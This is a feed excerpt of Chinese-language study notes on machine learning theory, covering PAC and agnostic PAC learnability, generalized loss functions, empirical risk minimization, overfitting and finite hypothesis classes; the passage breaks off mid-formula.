        <link href="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"><![CDATA[<blockquote><p>本文将介绍通用的学习模型 PAC 及其变体形式。</p><ul><li><p>最原始的 PAC 主要需要满足<strong>可实现假设</strong>，<strong>训练样本量要大于样本复杂度函数</strong>。</p></li><li><p>现实情况中，<strong>可实现假设难以满足</strong>（先验知识不一定猜得准），因此<strong>将目标标记函数改为数据-标签分布，并从中采样训练样本</strong>，就可以类似的得到 Agnostic PAC 。</p></li><li><p>原始的 PAC 中，标记函数将学习问题限制在二元分类任务中。为了获得更加通用的学习模型，我们定义更加一般的损失函数。通过损失函数，可计算真实误差和经验风险：</p></li></ul><blockquote><ul><li><p>在<strong>问题分布</strong>（<span class="math inline">\(\mathcal{D}\)</span>）上采样得到的误差函数的<strong>期望</strong>，作为<strong>真实误差</strong>；</p></li><li><p>在<strong>训练样本</strong>（<span class="math inline">\(S\)</span>）上采样得到的误差函数的<strong>平均值</strong>，作为<strong>经验风险</strong>；</p></li></ul></blockquote></blockquote><h1 id="pac-learning">PAC Learning</h1><p>在<a href="/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/">上一篇文章</a>中，我们证明了对于一个有限的假设集，<mark>如果拥有足量的训练样本（这些训练样本是从同一分布中独立采样，并被同一标记函数标记而生成的），ERM 会输出近似正确的假设</mark>。更一般的，我们定义 <em>Probably Approximately Correct Learning</em> （PAC）如下：</p><div class="note primary"><p><strong>Def. PAC Learnability</strong></p><p>如果</p><ul><li>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</li><li>并且存在一个学习算法满足以下条件：<ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(\mathcal{X}\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，任意的标记函数 <span class="math inline">\(f: \mathcal{X}\rightarrow \lbrace 0,1\rbrace\)</span> ，如果对于 <span class="math inline">\(\mathcal{H,D},f\)</span> 可实现假设（<em>realizability assumption</em> ，即 <span class="math inline">\(\exists\ h^\star\in \mathcal{H}, L_{D,f}(h^\star) = 0\)</span>）成立，那么当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样，并被 <span class="math inline">\(f\)</span> 标记而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\)</span>，并且该假设满足 <span class="math inline">\(L_{(\mathcal{D},f)}(h) \le \epsilon\)</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 是 PAC 可学习的</p></div><div class="note info"><p><strong>有关 PAC Learnability 的补充说明</strong></p><ul><li><span class="math inline">\(\epsilon\)</span> 称作<strong>精度参数</strong>（<em>accuracy parameter</em>），代表输出分类器与最优之间的误差大小（对应 PAC 中的 <strong><em>approximately correct</em></strong>）。这意味着，<span class="math inline">\(\epsilon\)</span> 允许学习算法犯一些小错误。</li><li><span class="math inline">\(\delta\)</span> 称作<strong>置信参数</strong>（<em>confidence parameter</em>），代表输出分类器满足上述精度要求的可能性（对应 PAC 中的 <strong><em>probably</em></strong>）</li><li><span class="math inline">\(m_{\mathcal{H}}:(0, 1) \rightarrow \mathbb{N}\)</span> 称作<strong>样本复杂度</strong>（<em>sample complexity</em>）函数，表示<strong>需要多少训练样本数据，才能够保证获得一个尽可能近似正确的答案</strong>。该函数依赖于 <span class="math inline">\(\epsilon, \delta,\mathcal{H}\)</span> 。依据 PAC Learnability 的定义，存在不止一个 <span class="math inline">\(m_{\mathcal{H}}\)</span> 满足条件。通常，我们定义 <span class="math inline">\(m_{\mathcal{H}}\)</span> 为满足条件的<strong>最小整数</strong>。</li></ul></div><p>对上一篇文章中获得的结论，我们换一种表达，则有下面的推论</p><div class="note default"><p><strong>PAC 可学习的样本复杂度条件</strong></p><p>每一个有限假设类都是 PAC 可学习的，只要它的样本复杂度满足： <span class="math display">\[m_{\mathcal{H}} \le \lceil \frac{log(\frac{\mathcal{H}}{\delta})}{\epsilon} \rceil\]</span></p></div><h1 id="a-more-general-learning-model">A More General Learning Model</h1><p>对于大多数任务，可实现假设很难得到满足，而且上述定义只适用于二元分类问题，因此通用性不佳。为了得到更加通用的学习模型，我们对上述模型从以下两个方面进行拓展：</p><ol type="1"><li>去除可实现假设。引入 <strong>Agnostic PAC</strong> 解决这个问题。</li><li>学习比二元分类问题更加广泛的任务。通过对<strong>损失函数的一般化</strong>来支持这种拓展。</li></ol><h2 id="releasing-the-realizablity-assumption-agnostic-pac-learning">Releasing the Realizablity Assumption —— Agnostic PAC Learning</h2><h3 id="a-more-realistic-model-for-the-data-generating-distribution">A More Realistic Model for the Data-Generating Distribution</h3><p>简单来说，我们可以将 “目标标记函数” 替换为<strong>数据-标签</strong>生成分布。</p><p>规范地，设 <span class="math inline">\(\mathcal{D}\)</span> 为 <span class="math inline">\(\mathcal{X} \times \mathcal{Y}\)</span> 上的概率分布，其中 <span class="math inline">\(\mathcal{X}\)</span> 为领域集，<span class="math inline">\(\mathcal{Y}\)</span> 为标签集。也就是说，<span class="math inline">\(\mathcal{D}\)</span> 为在领域点和标签上的联合分布。我们可以将 <span class="math inline">\(\mathcal{D}\)</span> 看作由两个部分组成：一个在未被标记的领域点上的分布 <span class="math inline">\(\mathcal{D}_x\)</span> （有时候，也称作<strong>边缘分布</strong>） ，另一个为每一个领域点的标签上的<strong>条件概率</strong> <span class="math inline">\(\mathcal{D}((x,y)|x)\)</span> 。</p><div class="note info"><p><strong>如何理解条件概率？</strong></p><ul><li>很多事情无法精确刻画，因此可用一个条件分布来描述。随着某一变量的变化，对应事件的概率也会发生变化。例如，<span class="math inline">\(\mathcal{D}(y|x)\)</span> 事件 <span class="math inline">\(y\)</span> 的概率会随着 <span class="math inline">\(x\)</span> 的变化而变化；此外，在 <span class="math inline">\(\mathcal{D}(y|x)\)</span> 中，<span class="math inline">\(\mathcal{D}(y|x)\)</span> 是关于 <span class="math inline">\(y\)</span> 的函数，而 <span class="math inline">\(x\)</span> 是作为函数的参数（如果要确定关于 <span class="math inline">\(y\)</span> 的函数关系，<span class="math inline">\(x\)</span> 要事先指定）。</li></ul></div><h3 id="the-empirical-and-true-error-revised">The Empirical and True Error Revised</h3><p>与分布的改变相对应，我们定义预测规则 <span class="math inline">\(h\)</span> <strong>真实误差</strong>（或者叫做<strong>风险</strong>）如下： <span class="math display">\[L_{\mathcal{D}}\overset{def}{=}\underset{(x,y)\sim \mathcal{D}}{\mathbb{P}}[h(x)\ne y] \overset{def}{=}\mathcal{D}(\lbrace (x,y): h(x) \ne y \rbrace) \tag{3.1}\]</span> 而经验风险并没有改变，依然是： <span class="math display">\[L_{S}(h)\overset{def}{=}\frac{|\lbrace i\in[m] : h(x_i) \ne y_i \rbrace|}{m}\]</span></p><h3 id="the-goal">The Goal</h3><p>学习算法的目标是寻找一些假设，<span class="math inline">\(h:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ，尽可能近似最小化真实风险，<span class="math inline">\(L_{\mathcal{D}}(h)\)</span></p><h3 id="the-bayes-optimal-predictor">The Bayes Optimal Predictor</h3><p>给定任意的在 <span class="math inline">\(\mathcal{X} \times \lbrace 0,1\rbrace\)</span> 上的概率分布，从 <span class="math inline">\(\mathcal{X}\)</span> 到 <span class="math inline">\(\lbrace 0, 1 \rbrace\)</span> 的最佳标记函数为 <span class="math display">\[f_{\mathcal{D}}(x) = \begin{cases} 1 &amp;if\ \mathbb{P}[y=1|x]\ge \frac{1}{2}\\ 0 &amp; otherwise\end{cases}\]</span> 这也就是说，对于任意的二元分类器 <span class="math inline">\(g: \mathcal{X}\rightarrow \lbrace 0, 1\rbrace\)</span>，<span class="math inline">\(L_{\mathcal{D}}(f_{\mathcal{D}}) \le L_{\mathcal{D}}(g)\)</span></p><div class="note info"><p><strong>证明 The Bayes Optimal Predictor</strong>（TODO）</p></div><p>一旦我们对数据生成分布不做任何预先假设，那么将没有算法将保证找到一个预测器，媲美 Bayes Optimal Predictor 的效果。因此，我们需要学习算法找到一个预测器，在给定某些假设类的基准测试时，<strong>它的误差并不会比可能的最佳的预测器的误差大太多</strong>。因此，我们有如下的 <strong>Agnostic PAC Learnability</strong>：</p><div class="note primary"><p><strong>Def. Agnostic PAC Learnability</strong></p><p>如果</p><ul><li><p>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</p></li><li><p>并且存在一个学习算法满足以下条件：</p><ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(\mathcal{X} \times\mathcal{Y}\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\)</span>，并且该假设满足： <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_D(h&#39;) + \epsilon\]</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 是 Agnostic PAC 可学习的</p></div><h2 id="generalized-loss-function-agnostic-pac-learning-for-general-loss-function">Generalized Loss Function —— Agnostic PAC Learning for General Loss Function</h2><p>为了适应不同的任务，我们接下来定义通用的损失函数。</p><p>给定任意的集合 <span class="math inline">\(\mathcal{H}\)</span> 和领域集 <span class="math inline">\(Z\)</span> ，设 <span class="math inline">\(l\)</span> 为任意 <span class="math inline">\(\mathcal{H}\times Z\)</span> 到非负实数的函数， <span class="math inline">\(l: \mathcal{H} \times Z \rightarrow \mathbb{R}_+\)</span> ，我们称 <span class="math inline">\(l\)</span> 为<strong>损失函数</strong>。</p><p>下面用分类器误差的期望来定义<strong>风险函数</strong>。</p><p>给定一个 <span class="math inline">\(h\in \mathcal{H}\)</span> ，关于在 <span class="math inline">\(Z\)</span> 上的概率分布 <span class="math inline">\(\mathcal{D}\)</span> ，对应的风险函数为： <span class="math display">\[L_{\mathcal{D}}(h)\overset{def}{=}\underset{z\sim \mathcal{D}}{\mathbb{E}}[l(h,z)]\tag{3.3}\]</span> 相似的，经验风险函数为对采样样本 <span class="math inline">\(S=(z_1,\dots,z_m)\in Z^m\)</span> 上的损失的期望： <span class="math display">\[L_S(h)\overset{def}{=}\frac{1}{m}\sum_{i=1}^{m}l(h,z_i)\tag{3.4}\]</span> 综上所述，有如下更加通用的 Agnostic PAC 的定义：</p><div class="note primary"><p><strong>Def. Agnostic PAC Learning for General Loss Function</strong></p><p>如果</p><ul><li><p>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</p></li><li><p>并且存在一个学习算法满足以下条件：</p><ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(Z\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\in \mathcal{H}\)</span>，并且该假设满足 <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_{\mathcal{D}}(h&#39;)+ \epsilon\]</span> 其中 <span class="math inline">\(L_{\mathcal{D}}(h) = \mathbb{E}_{z\sim D}[l(h, z)]\)</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 关于一个集合 <span class="math inline">\(Z\)</span> 和 损失函数 <span class="math inline">\(l:\mathcal{H}\times Z\rightarrow \mathbb{R}_+\)</span> 是 Agnostic PAC 可学习的</p></div><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/</id>
        <title><![CDATA[统计学习框架及经验风险最小化]]></title>
        <updated>2020-12-13T06:40:34+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"><![CDATA[<blockquote><p>本文主要介绍两个内容：</p><ol type="1"><li><strong>统计学习框架</strong>。这是一个十分通用的框架，指明了学习的<strong>输入</strong>、<strong>输出</strong>和<strong>学习目标</strong>。</li><li><strong>经验风险最小化</strong>（<strong>ERM</strong>）的学习方法。引入<strong>经验风险</strong>，从而可以<strong>从训练数据中管中窥豹</strong>，归纳出一般规律。但是 ERM <strong>会产生过拟合</strong>现象。一种常见的解决方案是<strong>引入归纳偏好</strong>（或者是先验知识）。具体来说，确定一个有<strong>限的假设类</strong>集合，供学习算法学习。这样是否是有效的？通过证明发现，<strong>只要有足够的训练样本，就可以达到比较好的效果</strong>。</li></ol></blockquote><h1 id="a-formal-model-the-statistical-learning-framework">A Formal Model —— The Statistical Learning Framework</h1><h2 id="the-learners-input">The Learner's Input</h2><ul><li><strong>领域集（<em>Domain set</em>）</strong>：这是我们<strong>希望标记的事物的集合</strong>，记作 <span class="math inline">\(\mathcal{X}\)</span> 。通常情况下，人们会用一个特性向量（vector of <em>features</em>）表示这些领域点（<em>domain points</em>）。</li></ul><div class="note info"><ul><li>领域集（<em>domain set</em>）又称作实例空间（<em>instance space</em>）</li><li>领域点（<em>domain points</em>）又称作实例（<em>instances</em>）</li></ul></div><ul><li><strong>标签集（<em>Label set</em>）</strong>：这是<strong>可能的标签的集合</strong>，记作 <span class="math inline">\(\mathcal{Y}\)</span> 。</li><li><strong>训练数据（<em>Training data</em>）</strong>：这是一系列已经被标记的领域点，常常表示为 <span class="math inline">\(S=((x_1,\ y_1)\dots(x_m,\ y_m))\)</span> （这是在 <span class="math inline">\(\mathcal{X}\times \mathcal{Y}\)</span> 中的<strong>有限</strong>的数对序列）</li></ul><div class="note info"><ul><li>训练数据（<em>training data</em>）又称作 <strong><em>training examples</em></strong>，或者 <strong><em>training set</em></strong></li></ul></div><h2 id="the-learners-output">The Learner's Output</h2><p>人们希望学习器输出一个<strong>预测规则</strong>（<em>prediction rule</em>）：<span class="math inline">\(h:\mathcal{X} \rightarrow \mathcal{Y}\)</span> 。这个函数又称作为<strong>预测器</strong>（<em>predictor</em>）、<strong>假设</strong>（<em>hypothesis</em>）或者是<strong>分类器</strong>（<em>classifier</em>）。此外，我们记一个学习算法 <span class="math inline">\(A\)</span> ，接受训练数据 <span class="math inline">\(S\)</span> 为输入，返回对应假设为 <span class="math inline">\(A(S)\)</span> 。</p><h2 id="a-simple-data-generation-model">A Simple Data-generation Model</h2><p>训练数据是如何生成的？这里给出两个假设。</p><ul><li>假设所有的实例都由一个概率分布生成，记这个在 <span class="math inline">\(\mathcal{X}\)</span> 上的概率分布为 <span class="math inline">\(\mathcal{D}\)</span> 。</li><li>假设存在一个“完全正确”的标记函数 <span class="math inline">\(f:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ，显然，对于任意的 <span class="math inline">\(i\)</span> ，有 <span class="math inline">\(y_i=f(x_i)\)</span></li></ul><p>总的来说，在训练数据中的每一个数对，都由以下方式生成：</p><ol type="1"><li>先从概率分布 <span class="math inline">\(\mathcal{D}\)</span> 采样得到一个点 <span class="math inline">\(x_i\)</span> ；</li><li>再利用标记函数 <span class="math inline">\(f\)</span> 为 <span class="math inline">\(x_i\)</span> 打上标签。</li></ol><h2 id="measures-of-success">Measures of Success</h2><p>如何衡量算法学习是否成功？这里可以定义一个<strong>分类器的误差</strong>（<em>error of a classifier</em>），即学习算法没有正确预测随机数据（这些随机数据，是由前面提到的对于学习算法隐含的概率分布所生成的）的标签的概率。也就是说，<span class="math inline">\(h\)</span> 的误差是<strong>从分布 <span class="math inline">\(\mathcal{D}\)</span> 随机中取出一个 <span class="math inline">\(x\)</span> ，而 <span class="math inline">\(h(x)\)</span> 不等于 <span class="math inline">\(f(x)\)</span> 的概率</strong>。</p><p>规范的来讲，给定一个领域子集（<em>domain subset</em>），<span class="math inline">\(A\subset \mathcal{X}\)</span> ，概率分布 <span class="math inline">\(\mathcal{D}\)</span> ，定义一个数 <span class="math inline">\(\mathcal{D}(A)\)</span> ，其中 <span class="math inline">\(\mathcal{D}(A)\)</span> 表示学习算法在 <span class="math inline">\(\mathcal{D}\)</span> 中观察到一个点 <span class="math inline">\(x\in A\)</span> 的可能性。我们定义预测规则（<em>prediction rule</em>）的误差如下： <span class="math display">\[L_{\mathcal{D},f}(h)\overset{def}{=}\underset{x\sim\mathcal{D}}{\mathbb{P}}[h(x)\ne f(x)]\overset{def}{=}\mathcal{D}(\lbrace x:h(x)\ne f(x)\rbrace)\tag{2.1}\]</span> <div class="note info"><p><strong>有关 <span class="math inline">\(A\)</span> 与 <span class="math inline">\(\mathcal{D}(A)\)</span> 的补充说明</strong></p><ul><li>在许多情况下，我们将 <span class="math inline">\(A\)</span> 称作一个事件（<em>event</em>）</li><li>二元分类问题中，我们定义 <span class="math inline">\(A\)</span> 为 <span class="math inline">\(\pi :\mathcal{X}\rightarrow \lbrace0,1\rbrace\)</span> ，也就有 <span class="math inline">\(A = \lbrace x\in\mathcal{X}: \pi(x) = 1\rbrace\)</span> 。在这种情况下，我们也使用 <span class="math inline">\(\mathbb{P}_{x\sim \mathcal{D}}[\pi(x)]\)</span> 来表达 <span class="math inline">\(\mathcal{D}(A)\)</span> 。</li></ul></div></p><div class="note info"><p><strong><span class="math inline">\(L_{\mathcal{D},f}\)</span> 的别称</strong></p><p><span class="math inline">\(L_{\mathcal{D},f}\)</span> 又称作<strong>泛化误差</strong>（<strong><em>generalization error</em></strong>），<strong>风险</strong>（<strong><em>risk</em></strong>），<strong><span class="math inline">\(h\)</span> 的真正误差</strong>（<strong><em>true error</em> of h</strong>）</p></div><h2 id="a-note-about-the-information-available-to-the-learner">A Note about The Information Available to The Learner</h2><p>要注意的是，<strong>学习器本身并不知晓隐含的概率分布 <span class="math inline">\(\mathcal{D}\)</span> 和 “完全正确” 的标记函数 <span class="math inline">\(f\)</span></strong> 。因此，学习器只能通过观察训练数据集，和环境交互，才能发现规律。</p><div class="note info"><h2 id="summary">Summary</h2><ul><li><strong>学习算法的输入和输出</strong>：一个学习算法接受一个<strong>训练集</strong> <span class="math inline">\(S\)</span> 作为<strong>输入</strong>，并且<strong>输出</strong>一个<strong>预测器</strong>（<em>predictor</em>） <span class="math inline">\(h_S: \mathcal{X} \rightarrow \mathcal{Y}\)</span> 。其中，训练集 <span class="math inline">\(S\)</span> 通过以下过程生成：首先从一个未知分布 <span class="math inline">\(D\)</span> 中采样，然后使用目标函数（<em>target function</em>） <span class="math inline">\(f\)</span> 标记。此外，预测器 <span class="math inline">\(h_S\)</span> 的下标 <span class="math inline">\(S\)</span> 强调了输出的 <span class="math inline">\(h_S\)</span> 是依赖于 <span class="math inline">\(S\)</span> 的。</li><li><strong>学习算法的目标</strong>：学习算法的目标是找到一个 <span class="math inline">\(h_S\)</span> ，关于未知分布 <span class="math inline">\(\mathcal{D}\)</span> 和标记函数 <span class="math inline">\(f\)</span> ，它能最小化误差。</li></ul></div><h1 id="empirical-risk-minimization-erm">Empirical Risk Minimization （ERM）</h1><h2 id="empirical-error">Empirical Error</h2><p>由于学习器并不知道 <span class="math inline">\(\mathcal{D}\)</span> 和 <span class="math inline">\(f\)</span> ，因此，式（2.1）无法直接计算。学习器能够计算的是<strong>训练误差</strong>（<em>training error</em>），即分类器在训练数据上产生的误差，其定义如下： <span class="math display">\[L_S(h)\overset{def}{=}\frac{|\lbrace i\in[m]:h(x_i)\ne y_i \rbrace|}{m}\tag{2.2}\]</span></p><p>其中 <span class="math inline">\([m]=\lbrace 1,\dots ,m\rbrace\)</span> 。</p><div class="note info"><p><strong>训练误差</strong>（<em>training error</em>）有时又称作<strong>经验误差</strong>（<strong><em>empirical error</em></strong>）或者<strong>经验风险</strong>（<strong><em>empirical risk</em></strong>）</p></div><h2 id="erm">ERM</h2><p>既然学习算法能够从训练数据中获取关于这个世界的简要情况，所以寻找一个在训练数据上效果良好的答案是说得通的。<strong>寻找一个最小化 <span class="math inline">\(L_S(h)\)</span> 的 <span class="math inline">\(h\)</span></strong> 的学习范式称作经验风险最小化（<strong>Empirical Risk Minimization</strong>），简称 <strong>ERM</strong></p><h2 id="the-problem-of-erm-overfitting">The problem of ERM —— Overfitting</h2><p>然而，ERM 可能会产生一种错误——过拟合。下面用一个例子说明。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/09/example-of-overfitting.PNG" alt="过拟合的例子. Source:《Understanding Machine Learning: From Theory to Algorithms》" /><figcaption>过拟合的例子. Source:《Understanding Machine Learning: From Theory to Algorithms》</figcaption></figure><p>假设概率分布 <span class="math inline">\(\mathcal{D}\)</span> 是灰色正方形框中的均匀分布，如果实例落在蓝色实例所在的黑色正方形框中，标记函数 <span class="math inline">\(f\)</span> 将其标记为 1，否则标记为 0。考虑如下的预测器：</p><p><span class="math display">\[h_S(x)= \begin{cases}y_i\quad &amp;if\ \exists i\in[m]\ s.t. x_i=x;\\0\quad &amp;ohterwise. \end{cases}\]</span></p><p>因为 <span class="math inline">\(h_S\)</span> 在训练数据上，对实例标签的预测全部正确，所以 <span class="math inline">\(L_S(h_s) = 0\)</span> 。根据经验风险最小化的原则，式子 （2.3）会被 ERM 选中（因为没有比 0 更小的训练损失）。然而如果取训练数据以外的一个点 <span class="math inline">\(x&#39;\)</span>，并且这个点在黑色正方形框中，那么根据式（2.3），<span class="math inline">\(h_S(x&#39;) = 0\)</span> 。而实际上 <span class="math inline">\(f(x&#39;) = 1\)</span>，这就会产生错误。</p><p>这种现象称作<strong>“过拟合”</strong>（<em>overfitting</em>）。直观的来说，当学习算法找到的假设<strong>太符合</strong>训练数据时，就会发生过拟合。</p><h2 id="empirical-risk-minimization-with-inductive-bias">Empirical Risk Minimization with Inductive Bias</h2><h3 id="applying-erm-over-a-restricted-search-space">Applying ERM over a Restricted Search Space</h3><p>一种常见的解决 ERM 过拟合的方法是<strong>限制 ERM 的搜索空间</strong>。规范的讲，在见到数据之前，学习器应该事先挑选出一个预测器集合。这个预测器集合又称作<strong>“假设类”</strong>（<em>hypothesis class</em>），记作 <span class="math inline">\(\mathcal{H}\)</span> 。每一个 <span class="math inline">\(h\in \mathcal{H}\)</span> 是一个 <span class="math inline">\(\mathcal{X}\rightarrow \mathcal{Y}\)</span> 的函数。<strong>给定一个假设类 <span class="math inline">\(\mathcal{H}\)</span> ，一个训练集 <span class="math inline">\(\mathcal{S}\)</span> ，<span class="math inline">\(ERM_{\mathcal{H}}\)</span> 学习器使用 ERM 规则来选取一个在 <span class="math inline">\(\mathcal{S}\)</span> 上有最小可能误差的 <span class="math inline">\(h\)</span> ，其中 <span class="math inline">\(h\in \mathcal{H}\)</span></strong> 。规范地，我们有如下公式： <span class="math display">\[ERM_{\mathcal{H}}(S)\in \underset{h\in \mathcal{H}}{argmin}(L_S(h))\]</span> 其中，<span class="math inline">\(argmin\)</span> 表示在 <span class="math inline">\(\mathcal{H}\)</span> 中使得 <span class="math inline">\(L_S(h)\)</span> 最小的假设集合（<span class="math inline">\(h\in\mathcal{H}\)</span>）。通过限制学习器从 <span class="math inline">\(\mathcal{H}\)</span> 中选取预测器，学习器会偏向我们所特定的预测器集合。这种限制常常被称为<strong>归纳偏好</strong>（<em>inductive bias</em>）。由于这种限制的选择在学习器看到数据之前就确定了，因此在理想情况下，它应该基于一些有关所学问题的先验知识（<em>prior knowledge</em>）。</p><p>直观地，<strong>选择一个首先更多的假设类会更好地防止过拟合的发生，但是与此同时，这可能会导致一个更强的归纳偏好</strong>。</p><h3 id="finite-hypothesis-classes">Finite Hypothesis Classes</h3><p>对类的最简单的限制是设置一个其大小的上界（也就是，限制 <span class="math inline">\(\mathcal{H}\)</span> 中预测器 <span class="math inline">\(h\)</span> 的个数）。对应的，我们有如下结论：</p><ul><li><strong>只要有足够数量的训练样本，如果 <span class="math inline">\(\mathcal{H}\)</span> 是一个有限的类（<em>finite class</em>），那么 <span class="math inline">\(ERM_{\mathcal{H}}\)</span> 将不会产生过拟合。</strong></li></ul><p>那么至少需要多少训练样本呢？下面我们讨论这个问题</p><p>在此之前，我们先引入两个假设：</p><ol type="1"><li><strong>可实现假设</strong>（<strong><em>The Realizability Assumption</em></strong>）：<span class="math inline">\(\exists h^\star \in \mathcal{H},\ L_{(\mathcal{D},f)}(h^\star) = 0\)</span> 。</li><li><strong>独立同分布假设</strong>（<strong><em>The i.i.d. Assumption</em></strong>）：训练数据中每一个样本都关于分布 <span class="math inline">\(\mathcal{D}\)</span> <strong>独立同分布</strong>（<strong>independently and identically distributed</strong>，short for <strong>i.i.d.</strong>），记作 <span class="math inline">\(S\sim D^m\)</span> 。其中， <span class="math inline">\(m\)</span> 是 <span class="math inline">\(S\)</span> 的大小，<span class="math inline">\(D^m\)</span> 表示了根据 <span class="math inline">\(\mathcal{D}\)</span> 采样 <span class="math inline">\(m\)</span> 个元素，构成 <span class="math inline">\(m\)</span> 元组，且每一个元素都独立于 <span class="math inline">\(m\)</span> 元组其他元素</li></ol><div class="note info"><p><strong>有关 <code>可实现假设</code> 和 <code>独立同分布假设</code> 的补充说明</strong></p><ul><li><code>可实现假设</code> 暗示了在随机的训练样本 <span class="math inline">\(S\)</span> ，<span class="math inline">\(S\)</span> 由从 <span class="math inline">\(\mathcal{D}\)</span> 中采样，又被 <span class="math inline">\(f\)</span> 标记所得，<span class="math inline">\(L_S(h^\star) = 0\)</span> 的可能性为 1。</li><li><code>独立同分布假设</code> 表示每一个 <span class="math inline">\(S\)</span> 中 <span class="math inline">\(x_i\)</span> 都是全新地从 <span class="math inline">\(\mathcal{D}\)</span> 中采样，并被 <span class="math inline">\(f\)</span> 标记后生成的。</li></ul></div><p>此外，定义 <span class="math inline">\(\delta\)</span> 为取得一个不具代表性（<em>nonrepresentative</em>）的样本的<strong>概率</strong>，<span class="math inline">\(1-\delta\)</span> 为预测行为的<strong>置信参数</strong>（<em>confidence parameter</em>）。</p><div class="note info"><p><strong>什么叫不具代表性（<em>nonrepresentative</em>）的样本？</strong></p><ul><li>这个样本不能代表实例的潜在规律。如一个水果本身很好吃，但是碰巧训练样本都是不好吃的，导致学习器学到了错误的结论。其中的不好吃的训练样本即是不具代表性的样本。</li></ul></div><p>由于我们不能确保完美的标签预测，因此这里我们进一步引入另一个用来衡量预测效果的参数，即<strong>精度参数</strong>（<em>accuracy parameter</em>）。其通常记作 <span class="math inline">\(\epsilon\)</span> 。我们用如下公式描述学习器是否获得成功：</p><ul><li>事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> 表示学习器的<strong>失败</strong></li><li>事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_S)\le \epsilon\)</span> 表示学习器的<strong>近似成功</strong>。</li></ul><p>令我们感兴趣的是，在由 <span class="math inline">\(m\)</span> 个实例构成的 <span class="math inline">\(m\)</span> 元组采样，会导致学习器失败的概率的<strong>上界</strong>。</p><p>规范的，记 <span class="math inline">\(S|_{x} = \lbrace x_1,\ \dots,\ x_m\rbrace\)</span> 为训练数据的实例，我们希望找到下式的上界：</p><p><span class="math display">\[\mathcal{D}(\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_{S}) &gt; \epsilon \rbrace)\]</span></p><p>记 <span class="math inline">\(\mathcal{H}_B\)</span> 为“坏的”假设，即</p><p><span class="math display">\[\mathcal{H}_B = \lbrace h\in\mathcal{H}: L_{(\mathcal{D},f)}(h) &gt; \epsilon\rbrace\]</span></p><p>再令</p><p><span class="math display">\[M = \lbrace S|_x : \exists h\in \mathcal{H}_B, L_S(h) = 0 \rbrace\]</span></p><p>显然，<span class="math inline">\(M\)</span> 表示了误导学习器的样本集合。换句话说，对于每一个 <span class="math inline">\(S|_x \in M\)</span> ，存在一个坏的假设，<span class="math inline">\(h\in \mathcal{H}_B\)</span> ，但是在 <span class="math inline">\(S|_x\)</span> 中它看上去是一个好的假设。</p><p>既然可实现假设表示存在 <span class="math inline">\(L_S(h_S) = 0\)</span> ，因此，事件 <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> 只可能在这种情况下发生：<span class="math inline">\(h\in \mathcal{H}_B\)</span> ，但是 <span class="math inline">\(L_S(h) = 0\)</span> 。也就是说，<strong>如果我们的采样样本在误导集合中，这种事件才会发生</strong>。因此，我们有：</p><p><span class="math display">\[\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace \subseteq M\]</span></p><p>进一步的，<span class="math inline">\(M\)</span> 可改写成：</p><p><span class="math display">\[M = \underset{h\in \mathcal{H}_B}{\bigcup} \lbrace S|_x : L_S(h) = 0\rbrace \tag{2.5}\]</span></p><p>因此，</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : 